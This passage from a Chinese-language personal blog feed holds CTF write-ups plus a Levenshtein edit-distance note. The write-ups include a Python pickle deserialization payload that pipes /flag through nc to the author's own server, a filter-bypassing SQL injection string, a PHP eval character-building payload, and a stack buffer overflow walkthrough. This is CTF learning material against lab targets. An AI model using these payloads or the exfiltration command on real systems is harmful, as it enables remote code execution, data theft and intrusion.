class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> pickle, base64, traceback</span><br><span class="line"></span><br><span class="line">Response.default_mimetype = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = base64.b64decode(data)</span><br><span class="line">            data = pickle.loads(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> traceback.format_exc()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br></pre></td></tr></table></figure><p>是一題Python序列化的題目，看到題目的當下我想到之前有看過可以濫用<code>pickle.loads</code>去達到RCE的文章，所以就先朝著這個目標前進。</p><p>原本想要試試看能不能讓他彈一個ReverseShell回來，不過不知道為什麼都不成功，所以最後只讓他可以印出Flag。</p><p>最後採用把flag cat出來之後回傳給自己的伺服器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadObj</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> os.system, (<span class="string">&#x27;cat /flag | nc &lt;My Server&gt; 5555;&#x27;</span>,)</span><br></pre></td></tr></table></figure><p>Flag: <code>AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck&#125;</code></p><h3 id="🦉Owl"><a href="#🦉Owl" class="headerlink" title="🦉Owl"></a>🦉Owl</h3><p>網頁就是個帳號密碼的登入介面，然而有個提示說: <code>UESS THE STUPID USERNAME / PASSWORD</code>，所以就先試試看常見的弱帳密來登入，發現可以用<code>admin/admin</code>來登入。</p><p>原本以為登入之後沒有東西了，結果上面有個Show hint的按鈕藏在上端。</p><p>Hint就是網頁的原碼:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings</span></span><br><span class="line">    ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    date_default_timezone_set(<span class="string">&#x27;Asia/Taipei&#x27;</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CSRF</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]))</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>] = md5(rand() * rand());</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;csrf.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$csrf</span> = <span class="keyword">new</span> Csrf(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$action</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$path</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$message</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$alert</span> = <span class="variable">$message</span> ? <span class="string">&#x27;alert(&#x27;</span> . json_encode(<span class="variable">$message</span>) . <span class="string">&#x27;)&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$path</span> = json_encode(<span class="variable">$path</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;<span class="subst">$alert</span>; document.location.replace(<span class="subst">$path</span>);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;logout&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;login&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// Validate CSRF token</span></span><br><span class="line">            <span class="variable">$token</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$token</span> || !<span class="variable">$csrf</span>-&gt;validate(<span class="variable">$token</span>)) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;invalid csrf_token&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if username and password are given</span></span><br><span class="line">            <span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$username</span> || !<span class="variable">$password</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;username and password should not be empty&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of sqlmap kiddies</span></span><br><span class="line">            <span class="keyword">if</span> (stripos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="string">&#x27;sqlmap&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;sqlmap is child&#x27;s play&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of you</span></span><br><span class="line">            <span class="variable">$bad</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/*&#x27;</span>, <span class="string">&#x27;*/&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;--&#x27;</span>];</span><br><span class="line">            <span class="variable">$username</span> = str_ireplace(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$username</span> = str_ireplace(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Auth</span></span><br><span class="line">            <span class="variable">$hash</span> = md5(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$row</span> = (<span class="keyword">new</span> SQLite3(<span class="string">&#x27;/db.sqlite3&#x27;</span>))</span><br><span class="line">                -&gt;querySingle(<span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$hash</span>&#x27;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;login failed&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;unknown action: <span class="subst">$action</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = @<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br></pre></td></tr></table></figure><p>看起來是個SQLi的題目，但是前面過濾了一些會用到的關鍵字，還過濾兩次，但其實是可以被繞過的!<br>比方說<code>union</code>，如果我把關鍵字做成<code>unoorrion</code>，第一次過濾後會變成<code>unorion</code>再經過一次之後會變成<code>union</code>就變成合法的關鍵字了! 每個關鍵字都可以透過這種方法來繞過! </p><p>但空白也會被過濾掉，但是其實可以透過<code>/</code>來代替空白，代替完的Query還是合法的!</p><p>最終Query: <code>&#39;/oorr**oorr/unoorrion/oorr**oorr/all/oorr**oorr/selecoorrt/oorr**oorr/1,group_concat(value),2/oorr**oorr/frfrfromomom/oorr**oorr/garbage/oorr*</code></p><p>Flag: <code>AIS3&#123;4_ch1ld_15_4_curly_d1mpl3d_lun471c&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;從接觸CTF到現在已經過了一年，在CTF的技術上的確進步了不少，但還有很長一段路要走呢!&lt;/p&gt;
&lt;p&gt;結果Pwn沒解掉幾題，花大部分時間在看web…事後看了pwn的題目才發現自己解的掉…早知道就先打PwnㄉQAQ&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="Writeup" scheme="https://twinklestar03.com/tags/Writeup/"/>
    
    <category term="CTF" scheme="https://twinklestar03.com/tags/CTF/"/>
    
    <category term="AIS3 Pre-Exam" scheme="https://twinklestar03.com/tags/AIS3-Pre-Exam/"/>
    
  </entry>
  
  <entry>
    <title>PHP字元的神奇運用</title>
    <link href="https://twinklestar03.com/Contest/CTF/MooncakeCTF/"/>
    <id>https://twinklestar03.com/Contest/CTF/MooncakeCTF/</id>
    <published>2019-08-29T16:00:00.000Z</published>
    <updated>2020-12-18T07:35:12.495Z</updated>
    
    <content type="html"><![CDATA[<p>有個以前在打CTF的朋友，拿以前出的PHP web題給我玩~</p><p>過程中學到了PHP一個很奇妙的特性…</p><a id="more"></a><hr><p>一開始就丟出了網頁的source code</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$_ = &quot;flag.txt&quot;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&quot;lol.nop&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]) || !is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$s</span>) &gt; <span class="number">300</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[0-9~!@#^$%&amp;*_+=\[\]|:;-]*$/&#x27;</span>, <span class="variable">$s</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;bad input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> .= <span class="string">&#x27;echo file_get_contents($_);&#x27;</span>;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只能用<code>0123456789~!@#^$%&amp;*_+=[]|:;-</code>來送指令進<code>eval()</code>。</p><p>原本是想說有沒有機會可以開webshell起來但發現不能使用()跟{}沒辦法執行任何函式，所以將注意力轉移到<code>$_</code>上，有甚麼辦法是可以用來把<code>lol.nop</code>改成<code>flag.txt</code>呢?</p><p>那就把注意力轉移到造字上面，PHP有個很酷的特性，用個範例就可以很輕鬆明白:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>++; <span class="comment">// b</span></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>++; <span class="comment">// c</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以透過<code>字元變數++</code>來改變字母，這代表我們可以造字，比較特別的是當造到<code>&#39;z&#39;</code>的時候在繼續家下去會變成一個陣列<code>[&#39;a&#39;, &#39;a&#39;]</code>如果想要在繼續造字下去可以透過存取<code>[1]</code>來繼續造字。</p><p>現在完成造字，但”lol.nop”跟”flag.txt”差一個字元，這邊發現一個php很神的特性，假設我有一個字串<code>&quot;ABCDEF&quot;</code>我可以透過<code>[6]=&#39;G&#39;</code>直接assign讓字串變成<code>&quot;ABCDEFG&quot;</code>，PHP真的是很神奇不是我在說…</p><p>我的Payload:<br><code>$__=$_[0];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_[7]=$__;$_[6]=$_[5];$_[5]=$__;$__++;$__++;$__++;$__++;$_[6]=$__;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_[4]=$_[3];$_[1]=$_[0];$_[0]=$__[1];$_[2]=$__[0];$__++;$_[3]=$__[1];</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;有個以前在打CTF的朋友，拿以前出的PHP web題給我玩~&lt;/p&gt;
&lt;p&gt;過程中學到了PHP一個很奇妙的特性…&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="Writeup" scheme="https://twinklestar03.com/tags/Writeup/"/>
    
    <category term="MooncakeCTF" scheme="https://twinklestar03.com/tags/MooncakeCTF/"/>
    
    <category term="PHP" scheme="https://twinklestar03.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm::Levenshtein distance(Edit Distance)</title>
    <link href="https://twinklestar03.com/Notes/Algorithm-EditDistance/"/>
    <id>https://twinklestar03.com/Notes/Algorithm-EditDistance/</id>
    <published>2019-08-23T16:00:00.000Z</published>
    <updated>2020-07-02T16:08:02.959Z</updated>
    
    <content type="html"><![CDATA[<p>學習筆記-<strong>Levenshtein distance(Edit Distance)</strong></p><p>不知不覺快一個月沒更新部落格了Σ( ° △ °)，太多事情要忙了阿~~~~<br>雖然之前學過了但是因緣際會下又碰到了，所以寫個文章複習一下(๑´ڡ`๑)</p><a id="more"></a><hr><h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>Levenshtein distance(Edit Distance)，可以稱為編輯距離，編輯距離可以用來比較兩個字串並求出相似度，所以可以用來做到模糊搜尋。</p><p>Edit Distance是這樣來比較兩個字串的，假設我有兩個字串A, B。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A &#x3D; &#39;AFEDC&#39;</span><br><span class="line">B &#x3D; &#39;ABDECG&#39;</span><br></pre></td></tr></table></figure><p>編輯距離可以想成我要把A變成B需要花幾<strong>步驟</strong>來完成，圍繞在以下3種動作:</p><ul><li><strong>Insert插入</strong>，插入一個字元</li><li><strong>Delete刪除</strong>，刪除一個字元</li><li><strong>Replace替換</strong>，替換一個字元</li></ul><p>作法是這樣的，開始逐一比較字元並修改，得出A變成B需要的步驟數。</p><p>箭頭代表字元指針</p><figure class="highlight m"><figcaption><span>模擬過程</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">移動指針</span><br><span class="line">    ↓</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">    ↑</span><br><span class="line">A[<span class="number">0</span>] <span class="built_in">=</span><span class="built_in">=</span> B[<span class="number">0</span>]，此時的cost <span class="built_in">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">移動指針</span><br><span class="line">     ↓</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">     ↑</span><br><span class="line">A[<span class="number">1</span>] !<span class="built_in">=</span> B[<span class="number">1</span>]，我們可以把F換成B，此時的cost + <span class="number">1</span> <span class="built_in">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">移動指針</span><br><span class="line">      ↓</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">      ↑</span><br><span class="line">A[<span class="number">2</span>] !<span class="built_in">=</span> B[<span class="number">2</span>]，我們可以把E換成D，此時的cost + <span class="number">1</span> <span class="built_in">=</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">省略部分...</span><br><span class="line"></span><br><span class="line">移動指針</span><br><span class="line">        ↓</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">        ↑</span><br><span class="line">A[<span class="number">4</span>] <span class="built_in">=</span><span class="built_in">=</span> B[<span class="number">4</span>]，不用修改，此時cost <span class="built_in">=</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">移動指針</span><br><span class="line">         ↓</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">         ↑</span><br><span class="line">A[<span class="number">5</span>] <span class="built_in">=</span><span class="built_in">=</span> B[<span class="number">5</span>]，A缺少一個字元，所以我們插入一個G，此時cost + <span class="number">1</span> <span class="built_in">=</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">把A變成B的cost是<span class="number">4</span>，所以EditDistance(A, B) <span class="built_in">=</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p>如果當字串長度不一樣的時候就會出現需要刪除或是插入的動作，如果都是B &gt; A就只會出現插入不會有刪除，如果B &lt; A反之。</p><hr><h1 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h1><p>知道原理之後就來產Code吧!</p><figure class="highlight c"><figcaption><span>Recursion</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EditDistance</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> len_s, <span class="keyword">const</span> <span class="keyword">char</span> *t, <span class="keyword">int</span> <span class="keyword">len_t</span>)</span></span>&#123; </span><br><span class="line">  <span class="keyword">int</span> cost;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 終止條件，當兩字串都為空 */</span></span><br><span class="line">  <span class="keyword">if</span> (len_s == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">len_t</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">len_t</span> == <span class="number">0</span>) <span class="keyword">return</span> len_s;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 檢查字元是否一樣，不一樣的話cost = 1 */</span></span><br><span class="line">  <span class="keyword">if</span> (s[len_s<span class="number">-1</span>] == t[<span class="keyword">len_t</span><span class="number">-1</span>])</span><br><span class="line">      cost = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      cost = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* return 最小編輯次數(刪除, 插入, 替換)*/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::min(EditDistance(s, len_s - <span class="number">1</span>, t, <span class="keyword">len_t</span>    ) + <span class="number">1</span>,</span><br><span class="line">                 EditDistance(s, len_s    , t, <span class="keyword">len_t</span> - <span class="number">1</span>) + <span class="number">1</span>,</span><br><span class="line">                 EditDistance(s, len_s - <span class="number">1</span>, t, <span class="keyword">len_t</span> - <span class="number">1</span>) + cost);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡有個比較特別的小地方，EditDistance(s, <strong>len_s + 1</strong>, t, len_t) 代表的是插入一個字元，但是這行其實不對，因為他不會終止遞迴，在這邊len_s + 1是改變後的字串(未來)，可是程式判斷的時候是以送進來的字串為主(過去)。</p><p>在這裡可以透過一個方法把len_s + 1 改成 len_t - 1，在這裡可以花一點時間思考為什麼。</p><p>其實原因是插入代表我把一個原字串沒有的字元加進字串(len_s + 1)，相當於我跟相比較的字串少了一個不相同的地方(len_t - 1)，所以其實這兩者是表達一樣的東西。</p><p>這個演算法還可以透過Dynamic Programming來完成，改天再補上Code吧~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;學習筆記-&lt;strong&gt;Levenshtein distance(Edit Distance)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不知不覺快一個月沒更新部落格了Σ( ° △ °)，太多事情要忙了阿~~~~&lt;br&gt;雖然之前學過了但是因緣際會下又碰到了，所以寫個文章複習一下(๑´ڡ`๑)&lt;/p&gt;</summary>
    
    
    
    <category term="Notes" scheme="https://twinklestar03.com/categories/Notes/"/>
    
    
    <category term="StarNote" scheme="https://twinklestar03.com/tags/StarNote/"/>
    
    <category term="Algorithm" scheme="https://twinklestar03.com/tags/Algorithm/"/>
    
    <category term="Levenshtein distance" scheme="https://twinklestar03.com/tags/Levenshtein-distance/"/>
    
    <category term="Edit Distance" scheme="https://twinklestar03.com/tags/Edit-Distance/"/>
    
    <category term="Fuzzy" scheme="https://twinklestar03.com/tags/Fuzzy/"/>
    
  </entry>
  
  <entry>
    <title>Bamboofox-CTF解題紀錄</title>
    <link href="https://twinklestar03.com/Contest/CTF/Bamboofox-CTF/"/>
    <id>https://twinklestar03.com/Contest/CTF/Bamboofox-CTF/</id>
    <published>2019-07-20T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:27.219Z</updated>
    
    <content type="html"><![CDATA[<p>Bamboofox CTF解題記錄，一如往常地到處找題目增進自己打CTF的戰力╰(<em>°▽°</em>)╯</p><a id="more"></a><p>我選擇先從<a href="https://bamboofox.cs.nctu.edu.tw/courses/2/challenges">這裡</a>開始做</p><hr><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><hr><h2 id="Wargame-0-1-Magic-100"><a href="#Wargame-0-1-Magic-100" class="headerlink" title="Wargame 0-1 Magic [100]"></a>Wargame 0-1 Magic [100]</h2><blockquote><p>Description<br>Do you believe in magic?</p></blockquote><blockquote><p>Hint<br>Stack buffer overflow</p></blockquote><p>拿到檔案，magic: ELF 32-bit LSB executable，提示已經告知是Stack buffer overflow了，所以我直接IDA拆開來看了。</p><p><img src="/images/BamboofoxCTF/Magic/disass.JPG" alt="有漏洞的函式Magic()"><br>然後還有一個never_use()可以用來開shell，所以題目應該是希望我們把ret address指到該函式。</p><p>從<code>ax, [ebp-44h]</code>可知buffer大小是0x44，然後因為<code>mov     dword ptr [esp], offset aS ; &quot;%s&quot;</code>可知scanf()的格式化參數是%s，所以可以用垃圾把Buffer塞爆。</p><p>已經了解Buffer overflow成立之後就來建構payload吧! </p><p>需要塞0x44個byte進去把Buffer塞滿，這樣做之後會頂到ebp，所以在額外塞0x4個byte頂過ebp，這邊開始就是return address了! 蓋上never_use()的記憶體位置完成攻擊~<br>Payload: 0x48個byte + never_use()的位置</p><p>其實這樣攻擊是不會成功的，因為還有一個函式被忽略了，do_magic()，題目直接給出source</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_magic</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        